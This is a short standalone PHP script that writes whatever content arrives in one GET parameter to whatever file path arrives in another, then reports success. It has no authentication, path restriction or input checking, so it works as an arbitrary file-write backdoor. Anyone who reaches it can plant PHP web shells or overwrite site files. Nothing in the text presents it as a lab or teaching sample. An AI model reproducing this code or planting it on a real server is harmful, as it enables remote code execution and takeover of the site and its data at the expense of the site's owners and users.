<?php
$fname=$_GET['t1'];
$s=$_GET['t2'];
$f=fopen($fname, 'w');
fwrite($f, $s);
echo "The contents have been saved successfully";
?>


